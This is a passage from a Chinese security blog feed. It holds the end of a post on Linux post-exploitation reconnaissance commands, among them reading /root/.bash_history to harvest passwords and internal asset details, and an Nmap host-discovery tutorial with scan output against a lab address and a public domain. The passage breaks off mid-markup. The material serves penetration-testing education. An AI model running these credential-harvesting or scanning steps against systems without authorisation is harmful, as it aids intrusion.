title="Windows（域）"></a>Windows（域）</h1><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="0x01-查看当前权限"><a href="#0x01-查看当前权限" class="headerlink" title="0x01 查看当前权限"></a>0x01 查看当前权限</h2><pre class=" language-shell"><code class="language-shell">whoami</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Linux-Commands/查看当前权限.png" alt="查看当前权限"></center><ul><li>若非<code>root</code>用户则需要提权</li></ul><h2 id="0x02-查看网卡配置"><a href="#0x02-查看网卡配置" class="headerlink" title="0x02 查看网卡配置"></a>0x02 查看网卡配置</h2><pre class=" language-shell"><code class="language-shell">ifconfig</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Linux-Commands/查看网卡配置.png" alt="查看网卡配置"></center><h2 id="0x03-查看端口状态（开启了哪些服务，内网IP连接等）"><a href="#0x03-查看端口状态（开启了哪些服务，内网IP连接等）" class="headerlink" title="0x03 查看端口状态（开启了哪些服务，内网IP连接等）"></a>0x03 查看端口状态（开启了哪些服务，内网IP连接等）</h2><pre class=" language-shell"><code class="language-shell">netstat -anpt</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Linux-Commands/查看端口状态.png" alt="查看端口状态"></center><h2 id="0x04-查看进程状态"><a href="#0x04-查看进程状态" class="headerlink" title="0x04 查看进程状态"></a>0x04 查看进程状态</h2><pre class=" language-shell"><code class="language-shell">ps -ef</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Linux-Commands/查看进程状态.png" alt="查看进程状态"></center><h2 id="0x05-查看管理员的历史输入命令"><a href="#0x05-查看管理员的历史输入命令" class="headerlink" title="0x05 查看管理员的历史输入命令"></a>0x05 查看管理员的历史输入命令</h2><pre class=" language-shell"><code class="language-shell">cat /root/.bash_history</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Linux-Commands/查看管理员的历史输入命令.png" alt="查看管理员的历史输入命令"></center><ul><li>获取密码、网站目录、内网资产等信息</li></ul><h2 id="0x06-查找某个文件"><a href="#0x06-查找某个文件" class="headerlink" title="0x06 查找某个文件"></a>0x06 查找某个文件</h2><pre class=" language-shell"><code class="language-shell">find / -name *.cfg</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Intranet/Linux-Commands/查找某个文件.png" alt="查找某个文件"></center><ul><li>寻找配置文件</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap之主机发现</title>
      <link href="/2020/11/01/nmap-zhi-zhu-ji-fa-xian/"/>
      <url>/2020/11/01/nmap-zhi-zhu-ji-fa-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-主机发现原理"><a href="#0x00-主机发现原理" class="headerlink" title="0x00 主机发现原理"></a>0x00 主机发现原理</h1><p>​        主机发现发现的原理与Ping命令类似，发送探测包到目标主机，如果收到回复，那么说明目标主机是开启的。Nmap支持十多种不同的主机探测方式，比如发送<code>ICMP ECHO/TIMESTAMP/NETMASK报文</code>、发送<code>TCPSYN/ACK包</code>、发送<code>SCTP INIT/COOKIE-ECHO包</code>，用户可以在不同的条件下灵活选用不同的方式来探测目标机。</p><p>​        主机发现基本原理：（以ICMP echo方式为例）</p><p>​        Nmap的用户位于源端，IP地址192.168.0.5，向目标主机192.168.0.3发送ICMP Echo Request。如果该请求报文没有被防火墙拦截掉，那么目标机会回复ICMP Echo Reply包回来。以此来确定目标主机是否在线。</p><p>​        默认情况下，Nmap会发送四种不同类型的数据包来探测目标主机是否在线。</p><ol><li><p><code>ICMP echo request</code></p></li><li><p><code>a TCP SYN packet to port 443</code></p></li><li><p><code>a TCP ACK packet to port 80</code></p></li><li><p><code>an ICMP timestamp request</code></p></li></ol><p>​        依次发送四个报文探测目标机是否开启。只要收到其中一个包的回复，那就证明目标机开启。使用四种不同类型的数据包可以避免因防火墙或丢包造成的判断错误。</p><center><b>主机发现常用命令</b></center><table><thead><tr><th align="center">选项</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center"><code>-sP</code></td><td align="center">Ping扫描</td></tr><tr><td align="center"><code>-P0</code></td><td align="center">无Ping扫描</td></tr><tr><td align="center"><code>-PS</code></td><td align="center">TCP SYN Ping扫描</td></tr><tr><td align="center"><code>-PA</code></td><td align="center">TCP ACK Ping扫描</td></tr><tr><td align="center"><code>-PU</code></td><td align="center">UDP Ping 扫描</td></tr><tr><td align="center"><code>-PE；-PP；-PM</code></td><td align="center">ICMP Ping Types 扫描</td></tr><tr><td align="center"><code>-PR</code></td><td align="center">ARP Ping 扫描</td></tr><tr><td align="center"><code>-n</code></td><td align="center">禁止DNS反向解析</td></tr><tr><td align="center"><code>-R</code></td><td align="center">反向解析域名</td></tr><tr><td align="center"><code>--system-dns</code></td><td align="center">使用系统域名解析器</td></tr><tr><td align="center"><code>sL</code></td><td align="center">列表扫描</td></tr><tr><td align="center"><code>-6</code></td><td align="center">扫描IPv6地址</td></tr><tr><td align="center"><code>--traceroute</code></td><td align="center">路由跟踪</td></tr><tr><td align="center"><code>-PY</code></td><td align="center">SCTP INIT Ping</td></tr></tbody></table><h1 id="0x01-基本扫描"><a href="#0x01-基本扫描" class="headerlink" title="0x01 基本扫描"></a>0x01 基本扫描</h1><p>​        该扫描方式可以针对<strong>IP或者域名</strong>进行扫描，扫描方式迅速，可以很方便地<strong>发现目标端口的开放情况及主机在线情况</strong>。使用命令为如下格式：</p><pre class=" language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># IP</span>nmap 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148<span class="token comment" spellcheck="true"># 域名</span>nmap www<span class="token punctuation">.</span>furi<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn</code></pre><ul><li>若主机不存活，扫描得到的结果如下图所示：</li></ul><pre class=" language-powershell"><code class="language-powershell">λ nmap 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148            <span class="token comment" spellcheck="true"># 基本扫描，扫IP</span>Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 14:00 ?D1ú±ê×?ê±??Note: Host seems down<span class="token punctuation">.</span> <span class="token keyword">If</span> it is really up<span class="token punctuation">,</span> but blocking our ping probes<span class="token punctuation">,</span> <span class="token keyword">try</span> <span class="token operator">-</span>PnNmap done: 1 IP address <span class="token punctuation">(</span>0 hosts up<span class="token punctuation">)</span> scanned in 1<span class="token punctuation">.</span>66 seconds        <span class="token comment" spellcheck="true"># 结果主机不存活</span></code></pre><p><font color="blue">该命令执行结果和<code>nmap -sP 10.10.10.148</code>命令的执行结果一致。</font></p><ul><li>若主机存活，则扫描得到的结果如下图所示：</li></ul><pre class=" language-powershell"><code class="language-powershell">λ nmap www<span class="token punctuation">.</span>furi<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn             <span class="token comment" spellcheck="true"># 基本扫描，扫域名                         </span>Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 13:36 Nmap scan report <span class="token keyword">for</span> www<span class="token punctuation">.</span>furi<span class="token punctuation">.</span>com<span class="token punctuation">.</span>cn <span class="token punctuation">(</span>58<span class="token punctuation">.</span>215<span class="token punctuation">.</span>65<span class="token punctuation">.</span>32<span class="token punctuation">)</span>         Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>029s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>                                Not shown: 975 closed ports                                 PORT      STATE    SERVICE         <span class="token comment" spellcheck="true"># 主机中端口和服务扫描结果                         </span>21<span class="token operator">/</span>tcp    open     ftp             <span class="token comment" spellcheck="true"># ftp协议的21号端口开放                         </span>42<span class="token operator">/</span>tcp    filtered nameserver      <span class="token comment" spellcheck="true"># nameserver服务的42号端口可能被过滤               </span>53<span class="token operator">/</span>tcp    open     domain                                   80<span class="token operator">/</span>tcp    open     http                                     135<span class="token operator">/</span>tcp   filtered msrpc                                    139<span class="token operator">/</span>tcp   filtered netbios<span class="token operator">-</span>ssn                              445<span class="token operator">/</span>tcp   filtered microsoft<span class="token operator">-</span>ds                             593<span class="token operator">/</span>tcp   filtered http<span class="token operator">-</span>rpc<span class="token operator">-</span>epmap                           901<span class="token operator">/</span>tcp   filtered samba<span class="token operator">-</span>swat                               1025<span class="token operator">/</span>tcp  filtered NFS<span class="token operator">-or</span><span class="token operator">-</span>IIS                               1433<span class="token operator">/</span>tcp  open     ms<span class="token operator">-</span>sql<span class="token operator">-</span>s                                 1434<span class="token operator">/</span>tcp  filtered ms<span class="token operator">-</span>sql<span class="token operator">-</span>m                                 3128<span class="token operator">/</span>tcp  filtered squid<span class="token operator">-</span>http                               3306<span class="token operator">/</span>tcp  open     mysql                                    3389<span class="token operator">/</span>tcp  open     ms<span class="token operator">-</span>wbt<span class="token operator">-</span>server                            4444<span class="token operator">/</span>tcp  filtered krb524                                   6129<span class="token operator">/</span>tcp  filtered unknown                                  6669<span class="token operator">/</span>tcp  filtered irc                                      49152<span class="token operator">/</span>tcp open     unknown                                  49153<span class="token operator">/</span>tcp open     unknown                                  49154<span class="token operator">/</span>tcp open     unknown                                  49155<span class="token operator">/</span>tcp open     unknown                                  49156<span class="token operator">/</span>tcp open     unknown                                  49158<span class="token operator">/</span>tcp open     unknown                                  49167<span class="token operator">/</span>tcp open     unknown                                  Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 3<span class="token punctuation">.</span>77 seconds </code></pre><p><font color="blue">该命令执行结果和<code>nmap -P0 www.furi.com.cn</code>命令的执行结果一致。</font></p><h1 id="0x02-Ping扫描"><a href="#0x02-Ping扫描" class="headerlink" title="0x02 Ping扫描"></a>0x02 Ping扫描</h1><p>​        Ping扫描只进行Ping，然后显示出在线的主机，使用该选项扫描可以轻易地获取目标信息而不会被轻易发现。在默认的情况下，Nmap会发送一个ICMP回声请求和一个TCP报文到目标端口。Ping扫描的优点是不会返回太多结果信息且效率很高，但不能保证扫描结果的准确性。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span><span class="token function">sP</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148<span class="token operator">-</span>150            <span class="token comment" spellcheck="true"># 对指定范围内的IP进行Ping扫描</span>Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 14:35 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148       <span class="token comment" spellcheck="true"># 扫描10.10.10.148主机</span>Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>                <span class="token comment" spellcheck="true"># 确定主机存活</span>MAC Address: 00:0C:29:7C:0C:79 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 主机的MAC地址</span>Nmap done: 3 IP addresses <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 1<span class="token punctuation">.</span>65 seconds</code></pre><h1 id="0x03-无Ping扫描"><a href="#0x03-无Ping扫描" class="headerlink" title="0x03 无Ping扫描"></a>0x03 无Ping扫描</h1><p>​        无Ping扫描常用于防火墙禁止Ping的情况下，它能确定正在运行的主机。默认情况下，Nmap只对正在运行的主机进行高强度的探测，如端口扫描、版本探测、操作系统探测等。使用<code>-P0</code>选项后禁止使用Ping进行主机发现而会对每一个指定目标的IP地址进行扫有要求的扫描，这可以穿透防火墙也可以避免被防火墙发现。</p><ul><li>命令格式：<code>nmap -P0 [协议1、协议2、...] 目标</code></li></ul><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span>P0 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 14:46 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00094s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown: 963 closed portsPORT      STATE SERVICE80<span class="token operator">/</span>tcp    open  http81<span class="token operator">/</span>tcp    open  hosts2<span class="token operator">-</span>ns82<span class="token operator">/</span>tcp    open  xfer83<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev84<span class="token operator">/</span>tcp    open  ctf85<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev88<span class="token operator">/</span>tcp    open  kerberos<span class="token operator">-</span>sec89<span class="token operator">/</span>tcp    open  su<span class="token operator">-</span>mit<span class="token operator">-</span>tg90<span class="token operator">/</span>tcp    open  dnsix135<span class="token operator">/</span>tcp   open  msrpc139<span class="token operator">/</span>tcp   open  netbios<span class="token operator">-</span>ssn445<span class="token operator">/</span>tcp   open  microsoft<span class="token operator">-</span>ds1433<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>sql<span class="token operator">-</span>s3306<span class="token operator">/</span>tcp  open  mysql3389<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>wbt<span class="token operator">-</span>server8001<span class="token operator">/</span>tcp  open  vcom<span class="token operator">-</span>tunnel8002<span class="token operator">/</span>tcp  open  teradataordbms8007<span class="token operator">/</span>tcp  open  ajp128008<span class="token operator">/</span>tcp  open  http8009<span class="token operator">/</span>tcp  open  ajp138010<span class="token operator">/</span>tcp  open  xmpp8021<span class="token operator">/</span>tcp  open  ftp<span class="token operator">-</span>proxy8022<span class="token operator">/</span>tcp  open  oa<span class="token operator">-</span>system8031<span class="token operator">/</span>tcp  open  unknown8081<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>icecap8082<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>alerts8084<span class="token operator">/</span>tcp  open  unknown8085<span class="token operator">/</span>tcp  open  unknown8086<span class="token operator">/</span>tcp  open  d<span class="token operator">-</span>s<span class="token operator">-</span>n8088<span class="token operator">/</span>tcp  open  radan<span class="token operator">-</span>http8200<span class="token operator">/</span>tcp  open  trivnet149152<span class="token operator">/</span>tcp open  unknown49153<span class="token operator">/</span>tcp open  unknown49154<span class="token operator">/</span>tcp open  unknown49155<span class="token operator">/</span>tcp open  unknown49156<span class="token operator">/</span>tcp open  unknown49157<span class="token operator">/</span>tcp open  unknownMAC Address: 00:0C:29:7C:0C:79 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 2<span class="token punctuation">.</span>64 seconds</code></pre><ul><li><p>如果没有指定任何协议，Nmap会默认使用协议1、协议2、协议4，如果想知道这些协议的如何判断目标主机是否存活可以使用<code>--packet-trace</code>选项。</p><pre class=" language-powershell"><code class="language-powershell">nmap <span class="token operator">-</span>P0 <span class="token operator">--</span>packet<span class="token operator">-</span>trace 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148</code></pre></li><li><p>Nmap支持的协议和编号如下所示</p><ul><li>TCP：对应协议编号为6.</li><li>UDP：对应协议编号为17.</li><li>ICMP：对应协议编号为1.</li><li>IGMP：对应协议编号为2.</li></ul><pre class=" language-powershell"><code class="language-powershell">nmap <span class="token operator">-</span>P0 6<span class="token punctuation">,</span>17<span class="token punctuation">,</span>2 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148</code></pre></li></ul><h1 id="0x04-TCP-SYN-Ping扫描"><a href="#0x04-TCP-SYN-Ping扫描" class="headerlink" title="0x04 TCP SYN Ping扫描"></a>0x04 TCP SYN Ping扫描</h1><p>​        通常情况下，Nmap默认Ping扫描是使用<code>TCP SYN</code>和<code>ICMP ECHO</code>请求对目标进行是否存活的响应，当目标主机的防火墙阻止这些请求时，可以使用<code>TCP SYN Ping</code>扫描来进行对目标主机存活的判断。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span><span class="token function">PS</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 15:33 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00085s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown: 963 closed portsPORT      STATE SERVICE80<span class="token operator">/</span>tcp    open  http81<span class="token operator">/</span>tcp    open  hosts2<span class="token operator">-</span>ns82<span class="token operator">/</span>tcp    open  xfer83<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev84<span class="token operator">/</span>tcp    open  ctf85<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev88<span class="token operator">/</span>tcp    open  kerberos<span class="token operator">-</span>sec89<span class="token operator">/</span>tcp    open  su<span class="token operator">-</span>mit<span class="token operator">-</span>tg90<span class="token operator">/</span>tcp    open  dnsix135<span class="token operator">/</span>tcp   open  msrpc139<span class="token operator">/</span>tcp   open  netbios<span class="token operator">-</span>ssn445<span class="token operator">/</span>tcp   open  microsoft<span class="token operator">-</span>ds1433<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>sql<span class="token operator">-</span>s3306<span class="token operator">/</span>tcp  open  mysql3389<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>wbt<span class="token operator">-</span>server8001<span class="token operator">/</span>tcp  open  vcom<span class="token operator">-</span>tunnel8002<span class="token operator">/</span>tcp  open  teradataordbms8007<span class="token operator">/</span>tcp  open  ajp128008<span class="token operator">/</span>tcp  open  http8009<span class="token operator">/</span>tcp  open  ajp138010<span class="token operator">/</span>tcp  open  xmpp8021<span class="token operator">/</span>tcp  open  ftp<span class="token operator">-</span>proxy8022<span class="token operator">/</span>tcp  open  oa<span class="token operator">-</span>system8031<span class="token operator">/</span>tcp  open  unknown8081<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>icecap8082<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>alerts8084<span class="token operator">/</span>tcp  open  unknown8085<span class="token operator">/</span>tcp  open  unknown8086<span class="token operator">/</span>tcp  open  d<span class="token operator">-</span>s<span class="token operator">-</span>n8088<span class="token operator">/</span>tcp  open  radan<span class="token operator">-</span>http8200<span class="token operator">/</span>tcp  open  trivnet149152<span class="token operator">/</span>tcp open  unknown49153<span class="token operator">/</span>tcp open  unknown49154<span class="token operator">/</span>tcp open  unknown49155<span class="token operator">/</span>tcp open  unknown49156<span class="token operator">/</span>tcp open  unknown49157<span class="token operator">/</span>tcp open  unknownMAC Address: 00:0C:29:7C:0C:79 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 2<span class="token punctuation">.</span>54 seconds</code></pre><ul><li><p><code>-PS</code>选项发送一个设置为SYN标志位的空TCP报文，默认目的端口为80，但不同的端口也可以作为选项指定，设置可以指定一个以逗号分隔的端口列表，每个端口会被并发地扫描。</p><pre class=" language-powershell"><code class="language-powershell">nmap <span class="token operator">-</span>PS80<span class="token punctuation">,</span>100<span class="token operator">-</span>200 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148</code></pre></li></ul><h1 id="0x05-TCP-ACK-Ping扫描"><a href="#0x05-TCP-ACK-Ping扫描" class="headerlink" title="0x05 TCP ACK Ping扫描"></a>0x05 TCP ACK Ping扫描</h1><p>​        很多防火墙会封锁SYN报文，所以Nmap还提供了TCP ACK Ping扫描，与YCP SYN Ping不同的是TCP的标志位是ACK而不是SYN。Nmap发送一个ACK标志的TCP包给目标主机，如果目标主机不是存活状态则不响应该请求，如果目标主机在线会返回一个RST包。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span>PA 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 15:48 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00052s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown: 963 closed portsPORT      STATE SERVICE80<span class="token operator">/</span>tcp    open  http81<span class="token operator">/</span>tcp    open  hosts2<span class="token operator">-</span>ns82<span class="token operator">/</span>tcp    open  xfer83<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev84<span class="token operator">/</span>tcp    open  ctf85<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev88<span class="token operator">/</span>tcp    open  kerberos<span class="token operator">-</span>sec89<span class="token operator">/</span>tcp    open  su<span class="token operator">-</span>mit<span class="token operator">-</span>tg90<span class="token operator">/</span>tcp    open  dnsix135<span class="token operator">/</span>tcp   open  msrpc139<span class="token operator">/</span>tcp   open  netbios<span class="token operator">-</span>ssn445<span class="token operator">/</span>tcp   open  microsoft<span class="token operator">-</span>ds1433<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>sql<span class="token operator">-</span>s3306<span class="token operator">/</span>tcp  open  mysql3389<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>wbt<span class="token operator">-</span>server8001<span class="token operator">/</span>tcp  open  vcom<span class="token operator">-</span>tunnel8002<span class="token operator">/</span>tcp  open  teradataordbms8007<span class="token operator">/</span>tcp  open  ajp128008<span class="token operator">/</span>tcp  open  http8009<span class="token operator">/</span>tcp  open  ajp138010<span class="token operator">/</span>tcp  open  xmpp8021<span class="token operator">/</span>tcp  open  ftp<span class="token operator">-</span>proxy8022<span class="token operator">/</span>tcp  open  oa<span class="token operator">-</span>system8031<span class="token operator">/</span>tcp  open  unknown8081<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>icecap8082<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>alerts8084<span class="token operator">/</span>tcp  open  unknown8085<span class="token operator">/</span>tcp  open  unknown8086<span class="token operator">/</span>tcp  open  d<span class="token operator">-</span>s<span class="token operator">-</span>n8088<span class="token operator">/</span>tcp  open  radan<span class="token operator">-</span>http8200<span class="token operator">/</span>tcp  open  trivnet149152<span class="token operator">/</span>tcp open  unknown49153<span class="token operator">/</span>tcp open  unknown49154<span class="token operator">/</span>tcp open  unknown49155<span class="token operator">/</span>tcp open  unknown49156<span class="token operator">/</span>tcp open  unknown49157<span class="token operator">/</span>tcp open  unknownMAC Address: 00:0C:29:7C:0C:79 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 2<span class="token punctuation">.</span>50 seconds</code></pre><ul><li><p>Nmap提供的TCP SYN Ping和TCP ACK Ping两种方式可以同时使用</p><pre class=" language-powershell"><code class="language-powershell">nmap <span class="token operator">-</span>PA <span class="token operator">-</span><span class="token function">PS</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148</code></pre></li></ul><h1 id="0x06-UDP-Ping扫描"><a href="#0x06-UDP-Ping扫描" class="headerlink" title="0x06 UDP Ping扫描"></a>0x06 UDP Ping扫描</h1><p>​        使用UDP Ping扫描时Nmap会发送一个空的UDP包到目标主机，如果目标主机响应则返回一个ICMP端口不可达错误，如果目标不是存活状态则会返回各种ICMP报错信息。<code>-PU</code>选项是发送一个空的UDP报文到指定端口。如果不指定端口则默认是40125。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span>PU 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 15:55 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>0011s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown: 963 closed portsPORT      STATE SERVICE80<span class="token operator">/</span>tcp    open  http81<span class="token operator">/</span>tcp    open  hosts2<span class="token operator">-</span>ns82<span class="token operator">/</span>tcp    open  xfer83<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev84<span class="token operator">/</span>tcp    open  ctf85<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev88<span class="token operator">/</span>tcp    open  kerberos<span class="token operator">-</span>sec89<span class="token operator">/</span>tcp    open  su<span class="token operator">-</span>mit<span class="token operator">-</span>tg90<span class="token operator">/</span>tcp    open  dnsix135<span class="token operator">/</span>tcp   open  msrpc139<span class="token operator">/</span>tcp   open  netbios<span class="token operator">-</span>ssn445<span class="token operator">/</span>tcp   open  microsoft<span class="token operator">-</span>ds1433<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>sql<span class="token operator">-</span>s3306<span class="token operator">/</span>tcp  open  mysql3389<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>wbt<span class="token operator">-</span>server8001<span class="token operator">/</span>tcp  open  vcom<span class="token operator">-</span>tunnel8002<span class="token operator">/</span>tcp  open  teradataordbms8007<span class="token operator">/</span>tcp  open  ajp128008<span class="token operator">/</span>tcp  open  http8009<span class="token operator">/</span>tcp  open  ajp138010<span class="token operator">/</span>tcp  open  xmpp8021<span class="token operator">/</span>tcp  open  ftp<span class="token operator">-</span>proxy8022<span class="token operator">/</span>tcp  open  oa<span class="token operator">-</span>system8031<span class="token operator">/</span>tcp  open  unknown8081<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>icecap8082<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>alerts8084<span class="token operator">/</span>tcp  open  unknown8085<span class="token operator">/</span>tcp  open  unknown8086<span class="token operator">/</span>tcp  open  d<span class="token operator">-</span>s<span class="token operator">-</span>n8088<span class="token operator">/</span>tcp  open  radan<span class="token operator">-</span>http8200<span class="token operator">/</span>tcp  open  trivnet149152<span class="token operator">/</span>tcp open  unknown49153<span class="token operator">/</span>tcp open  unknown49154<span class="token operator">/</span>tcp open  unknown49155<span class="token operator">/</span>tcp open  unknown49156<span class="token operator">/</span>tcp open  unknown49157<span class="token operator">/</span>tcp open  unknownMAC Address: 00:0C:29:7C:0C:79 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 2<span class="token punctuation">.</span>78 seconds</code></pre><ul><li><p><code>-PU</code>选项也可以指定端口</p><pre class=" language-powershell"><code class="language-powershell">nmap <span class="token operator">-</span>PU80<span class="token punctuation">,</span>100 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148</code></pre></li></ul><h1 id="0x07-ICMP-Ping-Types扫描"><a href="#0x07-ICMP-Ping-Types扫描" class="headerlink" title="0x07 ICMP Ping Types扫描"></a>0x07 ICMP Ping Types扫描</h1><p>​        使用<code>-PE,-PP,-PM</code>选项可以进行ICMP Ping Types扫描。</p><ul><li><code>-PE</code>选项打开该回声请求功能；</li><li><code>-PP</code>选项是ICMP时间戳Ping扫描，虽然大多数的防火墙配置不允许ICMP Echo请求，但由于配置不当可能回复ICMP时间戳请求，所以可以使用ICMP时间戳来确定主机是否存活；</li><li><code>-PM</code>选项可以进行ICMP地址掩码Ping扫描。</li></ul><pre class=" language-powershell"><code class="language-powershell">nmap <span class="token operator">-</span>PE 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span 